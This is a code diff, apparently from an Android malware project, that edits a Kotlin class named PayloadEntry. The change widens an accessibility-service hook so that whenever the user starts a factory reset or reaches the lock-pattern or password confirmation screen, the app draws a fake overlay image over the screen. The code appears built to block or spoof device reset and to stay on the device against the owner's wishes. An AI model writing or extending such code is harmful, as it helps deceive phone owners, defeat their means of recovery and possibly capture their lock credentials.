@@ -62,14 +62,18 @@ class PayloadEntry : DynamicEntry {
                         DynamicEntry.activeAccessibilityService?.rootInActiveWindow?.let { dumpNode(it, 0) }
                     }
                     
-                    if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                    if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                         val source = event.source
                         val sId = source?.viewIdResourceName ?: "UNKNOWN_ID"
-                        val sTxt = source?.text?.toString() ?: "NO_TEXT"
-                        DynamicEntry.log("🖱️ CLICK ATTEMPT: id=[$sId] txt=[$sTxt]")
-                        
-                        if (sId.contains("initiate_main_clear")) {
-                            DynamicEntry.log("✅ MATCH FOUND! Launching overlay...")
+                        val eventText = event.text.joinToString(" ")
+                        val className = event.className?.toString() ?: ""
+
+                        val isResetId = sId.contains("initiate_main_clear")
+                        val isResetText = eventText.contains("Reset", ignoreCase = true)
+                        val isConfirmWindow = className.contains("ConfirmLockPattern") || className.contains("ConfirmLockPassword")
+
+                        if (isResetId || isResetText || isConfirmWindow) {
+                            DynamicEntry.log("🚨 RESET FLOW DETECTED! (Id:$isResetId, Txt:$isResetText, Win:$isConfirmWindow)")
                             DynamicEntry.overlayContent = {
                                 val resetBitmap = remember(resDir) {
                                     try { BitmapFactory.decodeFile(File(resDir, "resetconfirm.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
@@ -85,8 +89,6 @@ class PayloadEntry : DynamicEntry {
                                     }
                                 }
                             }
-                        } else {
-                            DynamicEntry.log("❌ NO MATCH: [$sId] != [initiate_main_clear]")
                         }
                     }
                 }
